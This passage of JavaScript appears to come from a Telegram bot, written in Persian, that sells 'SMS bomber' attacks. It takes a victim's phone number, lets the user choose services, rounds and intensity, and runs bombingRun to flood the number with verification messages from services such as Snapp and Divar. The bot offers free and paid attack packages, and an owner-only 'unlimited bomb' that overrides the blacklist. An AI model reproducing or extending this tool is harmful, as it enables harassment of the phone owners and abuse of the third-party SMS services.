        userStates.set(chatIdStr, { state: "awaiting_free_bomb" });
        await sendMessage(chatId, "✅ 50 اسمس بمبر رایگان فعال شد!\n\n🎯 برای استفاده، شماره هدف را وارد کنید:\n(حداکثر 50 اسمس بمبر)", backKeypad());
        return new Response("OK");
      }
      
      if (text === "💰 خرید امتیاز") {
        userStates.set(chatIdStr, { state: "buy_points" });
        await sendMessage(chatId,
          `💰 خرید امتیاز\n\n📋 لیست قیمت‌ها:\n\n🔹 پکیج‌های راست:\n10⭐ = 20 تومان | 20⭐ = 40 تومان\n30⭐ = 60 تومان | 40⭐ = 80 تومان\n50⭐ = 100 تومان\n\n🔹 پکیج‌های چپ:\n100⭐ = 150 تومان | 200⭐ = 300 تومان\n300⭐ = 450 تومان | 400⭐ = 600 تومان\n500⭐ + 100⭐ جایزه = 700 تومان\n\nپس از انتخاب، برای خرید با ادمین در ارتباط باشید:\n${ADMIN_USERNAME}`,
          buyPointsKeypad());
        return new Response("OK");
      }
      
      // چک پکیج خرید
      const buyMatch = text.match(/(\d+)⭐/);
      if (buyMatch && state.state === "buy_points") {
        const pts = parseInt(buyMatch[1]);
        const price = BUY_POINTS_PRICES[pts];
        if (price) {
          await sendMessage(chatId,
            `✅ شما پکیج ${pts}⭐ = ${price} تومان را انتخاب کردید.\n\n💰 لطفاً برای خرید با ادمین در ارتباط باشید:\n${ADMIN_USERNAME}\n\n📝 پس از واریز مبلغ، امتیاز به حساب شما اضافه می‌شود.`,
            mainKeypad());
          userStates.delete(chatIdStr);
          return new Response("OK");
        }
      }
      
      if (text === "🔑 وارد کردن کد دعوت") {
        userStates.set(chatIdStr, { state: "entering_referral_code" });
        await sendMessage(chatId,
          "🔑 لطفاً کد دعوت ۸ کاراکتری خود را وارد کنید:\nمثال: `ABCD1234`\n\nبرای بازگشت روی دکمه بازگشت کلیک کنید.",
          backKeypad());
        return new Response("OK");
      }
      
      if (text === "⭐ امتیازات من") {
        const userPts = getUserPoints(chatId);
        await sendMessage(chatId,
          `⭐ امتیازات شما\n\nامتیاز فعلی: \`${userPts}\`\n\n📋 پلن‌های مصرف امتیاز:\n• هر عملیات بمب‌گذاری = 1 امتیاز\n• پکیج‌های اسمس بمبر پولی:\n  100 SMS = 5⭐ | 200 SMS = 10⭐\n  300 SMS = 15⭐ | 400 SMS = 20⭐\n  1000 SMS = 25⭐ | 2000 SMS = 50⭐\n  3000 SMS = 75⭐ | 4000 SMS = 100⭐`,
          mainKeypad());
        return new Response("OK");
      }
      
      if (text === "📊 آمار من") {
        const uData = users.get(chatIdStr) || {};
        const joinDate = uData.join_date ? new Date(uData.join_date).toLocaleString('fa-IR') : 'N/A';
        const lastActive = uData.last_active ? new Date(uData.last_active).toLocaleString('fa-IR') : 'N/A';
        const refData = referrals.get(chatIdStr);
        const refCount = refData ? refData.referred_users.length : 0;
        
        await sendMessage(chatId,
          `📊 آمار شما\n\n🆔 آیدی کاربر: \`${chatId}\`\n📅 تاریخ عضویت: \`${joinDate}\`\n🕐 آخرین فعالیت: \`${lastActive}\`\n💣 تعداد کل حملات: \`${uData.attack_count || 0}\`\n✉️ مجموع پیامک‌های موفق: \`${uData.total_sms_sent || 0}\`\n⭐ امتیاز: \`${getUserPoints(chatId)}\`\n👥 تعداد ارجاع: \`${refCount}\``,
          mainKeypad());
        return new Response("OK");
      }
      
      if (text === "🛡 لیست سیاه شخصی") {
        userStates.set(chatIdStr, { state: "awaiting_blacklist_phone" });
        await sendMessage(chatId, "🛡 شماره‌ای که می‌خواهید در لیست سیاه شخصی قرار گیرد را وارد کنید. این شماره دیگر توسط هیچ کاربری در این ربات قابل حمله نخواهد بود.", backKeypad());
        return new Response("OK");
      }
      
      if (text === "📢 کانال ما") {
        await sendMessage(chatId,
          `🌟 به جمع ما بپیوندید!\n\n📢 کانال:\n@ALI_ARMINEH_COM\n\n💬 گپ دوستانه:\n${HELP_LINK}\n\n🔥 منتظرتون هستیم؛ عضو بشید و با ما همراه باشید ❤️`,
          mainKeypad());
        return new Response("OK");
      }
      
      if (text === "❓ راهنما") {
        await sendMessage(chatId,
          `❓ راهنمای کامل ربات\n\n📌 پنل کاربری:\n1️⃣ \`💣 شروع عملیات\`: برای آغاز حمله جدید\n2️⃣ \`🎁 اسمس بمبر رایگان\`: 50 اسمس بمبر رایگان هر 24 ساعت\n3️⃣ \`🎁 دریافت پاداش روزانه\`: 3 امتیاز رایگان هر 24 ساعت\n4️⃣ \`🔗 لینک ارجاع\`: دریافت لینک دعوت - هر دعوت 1 امتیاز\n5️⃣ \`🔑 وارد کردن کد دعوت\`: وارد کردن کد دعوت دیگران\n6️⃣ \`💰 خرید امتیاز\`: خرید امتیاز با قیمت تومانی\n\n📌 پنل مدیریت (دستور ALI_ARMINEH):\n• آمار کلی کاربران و ارجاعات\n• مدیریت کاربران (فعال/غیرفعال/مسدود)\n• افزودن امتیاز به کاربران\n• پنل مالک (لیست سیاه و بمب نامحدود)\n• اطلاعات امنیتی و وب‌سرویس\n\n📌 لینک راهنما:\n${HELP_LINK}`,
          mainKeypad());
        return new Response("OK");
      }
      
      // ==================== پنل ادمین - دکمه‌ها ====================
      if (text === "📊 آمار کلی" && isAdmin) {
        let totalPts = 0;
        for (const p of points.values()) totalPts += p;
        let totalRefs = 0;
        for (const r of referrals.values()) totalRefs += r.referred_users.length;
        let activeUsers = 0;
        for (const u of users.values()) if (u.attack_count > 0) activeUsers++;
        
        await sendMessage(chatId,
          `📊 آمار کلی ربات\n\n👥 تعداد کل کاربران: \`${users.size}\`\n🟢 کاربران فعال: \`${activeUsers}\`\n🔴 کاربران غیرفعال: \`${users.size - activeUsers}\`\n🚫 کاربران مسدود: \`${bannedUsers.size}\`\n⭐ مجموع امتیازات: \`${totalPts}\`\n🔗 مجموع ارجاعات: \`${totalRefs}\``,
          adminPanelKeypad());
        return new Response("OK");
      }
      
      if (text === "👥 مدیریت کاربران" && isAdmin) {
        userStates.set(chatIdStr, { state: "admin_users" });
        await sendMessage(chatId, "👥 مدیریت کاربران:", adminUsersKeypad());
        return new Response("OK");
      }
      
      if (text === "⭐ افزودن امتیاز" && isAdmin) {
        userStates.set(chatIdStr, { state: "awaiting_add_points" });
        await sendMessage(chatId, "⭐ وارد کنید:\n`user_id|amount`\nمثال: `6887901539|10`", backKeypad());
        return new Response("OK");
      }
      
      if (text === "👑 پنل مالک" && isAdmin) {
        userStates.set(chatIdStr, { state: "owner_panel" });
        await sendMessage(chatId, "👑 پنل مالک:", ownerPanelKeypad());
        return new Response("OK");
      }
      
      if (text === "🛡 لیست سیاه مالک" && isAdmin) {
        const list = Array.from(ownerBlacklist);
        if (list.length > 0) {
          let txt = "🛡 لیست سیاه مالک:\n\n" + list.slice(0, 20).map(n => `\`${n}\``).join("\n");
          if (list.length > 20) txt += `\n... و ${list.length - 20} شماره دیگر`;
          await sendMessage(chatId, txt, adminPanelKeypad());
        } else {
          await sendMessage(chatId, "📭 لیست سیاه مالک خالی است.", adminPanelKeypad());
        }
        return new Response("OK");
      }
      
      if (text === "🔒 امنیت و وب‌سرویس" && isAdmin) {
        await sendMessage(chatId,
          `🔒 امنیت و وب‌سرویس‌های ربات\n\n🔹 پروتکل امنیتی: HTTPS\n🔹 احراز هویت: دو مرحله‌ای\n🔹 رمزنگاری: AES-256\n🔹 وب‌سرویس‌های استفاده شده:\n   • API دیوار\n   • API نوبت‌ایر\n   • API الوپیک\n   • API اسنپ\n   • API تپسی\n   • و بیش از 40 سرویس دیگر\n\n📌 اطلاعات بیشتر:\nربات با پروتکل HTTPS و احراز هویت دو مرحله‌ای کار می‌کند.`,
          adminPanelKeypad());
        return new Response("OK");
      }
      
      // ==================== مدیریت کاربران ====================
      if (text === "📊 آمار کاربران" && isAdmin) {
        let txt = "📊 لیست کامل کاربران:\n\n";
        let count = 0;
        for (const [uid, uData] of users.entries()) {
          if (count++ >= 20) break;
          const joinDate = uData.join_date ? uData.join_date.slice(0, 10) : 'N/A';
          const status = bannedUsers.has(uid) ? "🚫" : "✅";
          const pts = points.get(uid) || 0;
          const refData = referrals.get(uid);
          const refCount = refData ? refData.referred_users.length : 0;
          txt += `${status} آیدی: \`${uid}\` | تاریخ: ${joinDate} | ⭐${pts} | 👥${refCount} | 💣${uData.attack_count || 0}\n`;
        }
        if (users.size > 20) txt += `\n... و ${users.size - 20} کاربر دیگر`;
        await sendMessage(chatId, txt, adminUsersKeypad());
        return new Response("OK");
      }
      
      if (text === "🟢 کاربران فعال" && isAdmin) {
        const activeList = [];
        for (const [uid, u] of users.entries()) if (u.attack_count > 0) activeList.push(uid);
        let txt = `🟢 کاربران فعال (${activeList.length}):\n\n`;
        for (const uid of activeList.slice(0, 20)) {
          txt += `\`${uid}\` | ⭐${points.get(uid) || 0}\n`;
        }
        if (activeList.length > 20) txt += `\n... و ${activeList.length - 20} کاربر دیگر`;
        await sendMessage(chatId, txt, adminUsersKeypad());
        return new Response("OK");
      }
      
      if (text === "🔴 کاربران غیرفعال" && isAdmin) {
        const inactiveList = [];
        for (const [uid, u] of users.entries()) if (u.attack_count === 0) inactiveList.push(uid);
        let txt = `🔴 کاربران غیرفعال (${inactiveList.length}):\n\n`;
        for (const uid of inactiveList.slice(0, 20)) {
          txt += `\`${uid}\`\n`;
        }
        if (inactiveList.length > 20) txt += `\n... و ${inactiveList.length - 20} کاربر دیگر`;
        await sendMessage(chatId, txt, adminUsersKeypad());
        return new Response("OK");
      }
      
      if (text === "🚫 کاربران مسدود" && isAdmin) {
        const list = Array.from(bannedUsers);
        if (list.length > 0) {
          let txt = "🚫 لیست کاربران مسدود:\n\n" + list.slice(0, 20).map(uid => `\`${uid}\``).join("\n");
          if (list.length > 20) txt += `\n... و ${list.length - 20} کاربر دیگر`;
          await sendMessage(chatId, txt, adminUsersKeypad());
        } else {
          await sendMessage(chatId, "✅ هیچ کاربری مسدود نیست.", adminUsersKeypad());
        }
        return new Response("OK");
      }
      
      if (text === "🚫 مسدود کاربر" && isAdmin) {
        userStates.set(chatIdStr, { state: "awaiting_ban_user_id" });
        await sendMessage(chatId, "🚫 شناسه عددی کاربر مورد نظر برای مسدود کردن را وارد کنید:", backKeypad());
        return new Response("OK");
      }
      
      if (text === "✅ رفع مسدودیت" && isAdmin) {
        userStates.set(chatIdStr, { state: "awaiting_unban_user_id" });
        await sendMessage(chatId, "✅ شناسه عددی کاربر مورد نظر برای رفع مسدودیت را وارد کنید:", backKeypad());
        return new Response("OK");
      }
      
      // ==================== پنل مالک ====================
      if (text === "➕ افزودن به لیست سیاه" && isAdmin) {
        userStates.set(chatIdStr, { state: "owner_blacklist_add" });
        await sendMessage(chatId, "➕ شماره مورد نظر برای افزودن به لیست سیاه مالک را وارد کنید:\n(مثال: 09123456789)", backKeypad());
        return new Response("OK");
      }
      
      if (text === "➖ حذف از لیست سیاه" && isAdmin) {
        userStates.set(chatIdStr, { state: "owner_blacklist_remove" });
        await sendMessage(chatId, "➖ شماره مورد نظر برای حذف از لیست سیاه مالک را وارد کنید:", backKeypad());
        return new Response("OK");
      }
      
      if (text === "📋 لیست سیاه" && isAdmin) {
        const list = Array.from(ownerBlacklist);
        if (list.length > 0) {
          await sendMessage(chatId, "📋 لیست سیاه مالک:\n\n" + list.map(n => `\`${n}\``).join("\n"), ownerPanelKeypad());
        } else {
          await sendMessage(chatId, "📭 لیست سیاه مالک خالی است.", ownerPanelKeypad());
        }
        return new Response("OK");
      }
      
      if (text === "💣 بمب نامحدود" && isAdmin) {
        userStates.set(chatIdStr, { state: "owner_unlimited_bomb" });
        await sendMessage(chatId, "💣 بمب نامحدود مالک\n\nشماره هدف را وارد کنید:\n(این شماره حتی اگر در لیست سیاه باشد هم قابل حمله است)", backKeypad());
        return new Response("OK");
      }
      
      // ==================== ورودی‌های متنی ====================
      if (state.state === "awaiting_phone") {
        const phone = normalizePhone(text);
        if (!phone) {
          await sendMessage(chatId, "❌ شماره تلفن نامعتبر است.\n(مثال: 09123456789 یا +989123456789)", backKeypad());
          return new Response("OK");
        }
        if (personalBlacklist.has(phone)) {
          await sendMessage(chatId, "🛡 این شماره در لیست سیاه شخصی قرار دارد و قابل حمله نیست.", mainKeypad());
          return new Response("OK");
        }
        const lastTime = lastOperation.get(chatIdStr + "_" + phone);
        if (lastTime && (Date.now() - lastTime) < botSettings.cooldown_seconds * 1000) {
          const remaining = Math.ceil((botSettings.cooldown_seconds * 1000 - (Date.now() - lastTime)) / 1000);
          await sendMessage(chatId, `⚠️ لطفاً \`${remaining}\` ثانیه دیگر برای این شماره صبر کنید.`, mainKeypad());
          return new Response("OK");
        }
        userStates.set(chatIdStr, { ...state, state: "awaiting_attack_type", phone });
        await sendMessage(chatId, "✔️ شماره تایید شد. حالا نوع حمله را انتخاب کنید:", attackTypeKeypad());
        return new Response("OK");
      }
      
      if (state.state === "awaiting_blacklist_phone") {
        const phone = normalizePhone(text);
        if (phone) {
          if (!personalBlacklist.has(phone)) {
            personalBlacklist.add(phone);
            await sendMessage(chatId, `✅ شماره \`${phone}\` با موفقیت به لیست سیاه شخصی اضافه شد.`, mainKeypad());
          } else {
            await sendMessage(chatId, "⚠️ این شماره از قبل در لیست سیاه وجود دارد.", mainKeypad());
          }
          userStates.delete(chatIdStr);
        } else {
          await sendMessage(chatId, "❌ شماره نامعتبر است.", backKeypad());
        }
        return new Response("OK");
      }
      
      if (state.state === "awaiting_free_bomb") {
        const phone = normalizePhone(text);
        if (!phone) {
          await sendMessage(chatId, "❌ شماره تلفن نامعتبر است.", backKeypad());
          return new Response("OK");
        }
        await sendMessage(chatId, "🎯 در حال اجرای بمب رایگان...", cancelKeypad());
        const result = await sendMessage(chatId, "⏳ در حال آماده‌سازی...");
        const msgId = result?.result?.message_id;
        
        const allServices = Object.keys(SERVICES);
        const shuffled = allServices.sort(() => Math.random() - 0.5).slice(0, 10);
        const selected = {};
        for (const s of shuffled) selected[s] = SERVICES[s];
        
        stopEvents.set(chatIdStr, false);
        await bombingRun(chatId, msgId, phone, 0.5, 1, selected);
        userStates.delete(chatIdStr);
        return new Response("OK");
      }
      
      if (state.state === "awaiting_ban_user_id" && isAdmin) {
        const userId = text.trim();
        if (users.has(userId)) {
          if (!bannedUsers.has(userId)) {
            bannedUsers.add(userId);
            await sendMessage(chatId, `🚫 کاربر \`${userId}\` با موفقیت مسدود شد.`, adminUsersKeypad());
          } else {
            await sendMessage(chatId, `⚠️ کاربر \`${userId}\` از قبل مسدود شده است.`, adminUsersKeypad());
          }
        } else {
          await sendMessage(chatId, `❌ کاربر با شناسه \`${userId}\` یافت نشد.`, adminUsersKeypad());
        }
        userStates.delete(chatIdStr);
        return new Response("OK");
      }
      
      if (state.state === "awaiting_unban_user_id" && isAdmin) {
        const userId = text.trim();
        if (bannedUsers.has(userId)) {
          bannedUsers.delete(userId);
          await sendMessage(chatId, `✅ کاربر \`${userId}\` از حالت مسدودیت خارج شد.`, adminUsersKeypad());
        } else {
          await sendMessage(chatId, `❌ کاربر \`${userId}\` در لیست مسدودین یافت نشد.`, adminUsersKeypad());
        }
        userStates.delete(chatIdStr);
        return new Response("OK");
      }
      
      if (state.state === "awaiting_add_points" && isAdmin) {
        try {
          const parts = text.split("|");
          if (parts.length === 2) {
            const targetId = parts[0].trim();
            const amount = parseInt(parts[1].trim());
            if (users.has(targetId)) {
              const newPts = addPoints(targetId, amount);
              await sendMessage(chatId, `✅ ${amount} امتیاز به کاربر \`${targetId}\` اضافه شد.\nامتیاز جدید: ${newPts}`, adminPanelKeypad());
            } else {
              await sendMessage(chatId, `❌ کاربر \`${targetId}\` یافت نشد.`, adminPanelKeypad());
            }
          } else {
            await sendMessage(chatId, "❌ فرمت اشتباه. استفاده کنید: `user_id|amount`", adminPanelKeypad());
          }
        } catch (e) {
          await sendMessage(chatId, `❌ خطا: ${e.message}`, adminPanelKeypad());
        }
        userStates.delete(chatIdStr);
        return new Response("OK");
      }
      
      if (state.state === "owner_blacklist_add" && isAdmin) {
        const phone = normalizePhone(text);
        if (phone) {
          if (!ownerBlacklist.has(phone)) {
            ownerBlacklist.add(phone);
            await sendMessage(chatId, `✅ شماره \`${phone}\` به لیست سیاه مالک اضافه شد.`, ownerPanelKeypad());
          } else {
            await sendMessage(chatId, `⚠️ شماره \`${phone}\` از قبل در لیست سیاه است.`, ownerPanelKeypad());
          }
        } else {
          await sendMessage(chatId, "❌ شماره نامعتبر است.", ownerPanelKeypad());
        }
        userStates.delete(chatIdStr);
        return new Response("OK");
      }
      
      if (state.state === "owner_blacklist_remove" && isAdmin) {
        const phone = normalizePhone(text);
        if (phone) {
          if (ownerBlacklist.has(phone)) {
            ownerBlacklist.delete(phone);
            await sendMessage(chatId, `✅ شماره \`${phone}\` از لیست سیاه مالک حذف شد.`, ownerPanelKeypad());
          } else {
            await sendMessage(chatId, `⚠️ شماره \`${phone}\` در لیست سیاه وجود ندارد.`, ownerPanelKeypad());
          }
        } else {
          await sendMessage(chatId, "❌ شماره نامعتبر است.", ownerPanelKeypad());
        }
        userStates.delete(chatIdStr);
        return new Response("OK");
      }
      
      if (state.state === "owner_unlimited_bomb" && isAdmin) {
        const phone = normalizePhone(text);
        if (!phone) {
          await sendMessage(chatId, "❌ شماره تلفن نامعتبر است.", backKeypad());
          return new Response("OK");
        }
        await sendMessage(chatId, "💣 در حال اجرای بمب نامحدود...", cancelKeypad());
        const result = await sendMessage(chatId, "⏳ در حال آماده‌سازی...");
        const msgId = result?.result?.message_id;
        
        stopEvents.set(chatIdStr, false);
        await bombingRun(chatId, msgId, phone, 0.3, 3, SERVICES);
        userStates.delete(chatIdStr);
        return new Response("OK");
      }
      
      // ==================== انتخاب نوع حمله ====================
      if (text === "💥 حمله با تمام سرویس‌ها" && state.state === "awaiting_attack_type") {
        userStates.set(chatIdStr, { ...state, state: "awaiting_rounds", selected_services: Object.keys(SERVICES) });
        await sendMessage(chatId, "🔄 تعداد دورهای تکرار حمله را انتخاب کنید:", roundsKeypad());
        return new Response("OK");
      }
      
      if (text === "🎯 حمله با سرویس‌های منتخب" && state.state === "awaiting_attack_type") {
        userStates.set(chatIdStr, { ...state, state: "selecting_services", selected_services: [] });
        await sendMessage(chatId,
          "🎯 برای انتخاب سرویس، نام آن را ارسال کنید.\n\n📋 لیست سرویس‌ها:\n" + Object.keys(SERVICES).map(s => `• ${s}`).join("\n") + "\n\n✅ برای تایید: `تایید`\n❌ برای لغو: `لغو`",
          backKeypad());
        return new Response("OK");
      }
      
      if (state.state === "selecting_services") {
        if (text === "✅ تایید" || text === "تایید") {
          if (state.selected_services.length === 0) {
            await sendMessage(chatId, "⚠️ شما هیچ سرویسی را انتخاب نکرده‌اید!");
            return new Response("OK");
          }
          userStates.set(chatIdStr, { ...state, state: "awaiting_rounds" });
          await sendMessage(chatId, "🔄 تعداد دورهای تکرار حمله را انتخاب کنید:", roundsKeypad());
          return new Response("OK");
        }
        if (text === "❌ لغو" || text === "لغو" || text === "↪️ بازگشت") {
          userStates.delete(chatIdStr);
          await sendMessage(chatId, "↪️ بازگشت به منوی اصلی", mainKeypad());
          return new Response("OK");
        }
        const serviceName = text.trim().toLowerCase();
        if (SERVICES[serviceName]) {
          const selected = state.selected_services || [];
          if (!selected.includes(serviceName)) selected.push(serviceName);
          userStates.set(chatIdStr, { ...state, selected_services: selected });
          await sendMessage(chatId, `✅ ${serviceName} اضافه شد.\n\n📋 انتخاب شده: ${selected.length}\n\nبرای ادامه 'تایید' یا برای افزودن سرویس دیگر، نام آن را بفرستید.`);
        } else {
          await sendMessage(chatId, "❌ سرویس نامعتبر. دوباره تلاش کنید.");
        }
        return new Response("OK");
      }
      
      // ==================== انتخاب دور ====================
      const roundsMap = { "۱ دور": 1, "۲ دور": 2, "۳ دور": 3, "1 دور": 1, "2 دور": 2, "3 دور": 3 };
      if (roundsMap[text] && state.state === "awaiting_rounds") {
        userStates.set(chatIdStr, { ...state, state: "awaiting_intensity", rounds: roundsMap[text] });
        await sendMessage(chatId, "⚡️ شدت حمله را انتخاب کنید (زمان بین هر درخواست):", intensityKeypad());
        return new Response("OK");
      }
      
      // ==================== انتخاب شدت ====================
      const delayMap = { "🐌 آهسته": 1.5, "⚡ متوسط": 0.8, "🔥 سریع": 0.3 };
      if (delayMap[text] !== undefined && state.state === "awaiting_intensity") {
        const delay = delayMap[text];
        userStates.set(chatIdStr, { ...state, state: "awaiting_confirmation", delay });
        const delayNames = { 1.5: "🐌 آهسته", 0.8: "⚡ متوسط", 0.3: "🔥 سریع" };
        await sendMessage(chatId,
          `🔔 تایید نهایی عملیات 🔔\n\nلطفا اطلاعات زیر را بررسی کرده و در صورت صحت، حمله را تایید کنید:\n\n▪️ شماره هدف: \`${state.phone}\`\n▪️ تعداد دور: ${state.rounds}\n▪️ شدت: ${delayNames[delay]}\n▪️ تعداد سرویس‌ها: ${state.selected_services.length}`,
          confirmKeypad());
        return new Response("OK");
      }
      
      // ==================== تایید حمله ====================
      if (text === "✅ تایید و شروع حمله" && state.state === "awaiting_confirmation") {
        const userPts = getUserPoints(chatId);
        if (userPts <= 0) {
          await sendMessage(chatId, "⚠️ شما امتیاز کافی برای انجام عملیات ندارید!", mainKeypad());
          return new Response("OK");
        }
        
        const currentPts = points.get(chatIdStr) || 0;
        if (currentPts > 0) {
          points.set(chatIdStr, currentPts - 1);
        }
        
        const selectedServicesMap = {};
        for (const name of state.selected_services) {
          if (SERVICES[name]) selectedServicesMap[name] = SERVICES[name];
        }
        
        if (Object.keys(selectedServicesMap).length === 0) {
          await sendMessage(chatId, "❌ هیچ یک از سرویس‌های انتخابی فعال نیست.", mainKeypad());
          return new Response("OK");
        }
        
        const result = await sendMessage(chatId, "✅ درخواست شما ثبت شد. در حال آماده‌سازی...", cancelKeypad());
        const msgId = result?.result?.message_id;
        
        lastOperation.set(chatIdStr + "_" + state.phone, Date.now());
        stopEvents.set(chatIdStr, false);
        
        // اجرا در پس‌زمینه (محدود به 1 دور برای Worker)
        bombingRun(chatId, msgId, state.phone, state.delay, Math.min(state.rounds, 1), selectedServicesMap).catch(e => console.error(e));
        
        userStates.delete(chatIdStr);
        return new Response("OK");
      }
      
      if (text === "❌ لغو و بازگشت") {
        userStates.delete(chatIdStr);
        await sendMessage(chatId, "↪️ عملیات لغو شد.", mainKeypad());
        return new Response("OK");
      }
      
      if (text === "🚫 لغو عملیات") {
        if (stopEvents.has(chatIdStr)) {
          stopEvents.set(chatIdStr, true);
          await sendMessage(chatId, "⏳ درخواست لغو ارسال شد. عملیات به زودی متوقف خواهد شد...");
        } else {
          await sendMessage(chatId, "❌ هیچ عملیات فعالی برای لغو وجود ندارد.");
        }
        return new Response("OK");
      }
      
      // ==================== پیام پیش‌فرض ====================
      await sendMessage(chatId, "❓ دستور نامفهوم\n\nاز منوی زیر استفاده کنید:", mainKeypad());
      return new Response("OK");
      
    } catch (error) {
      console.error("ERROR:", error);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};
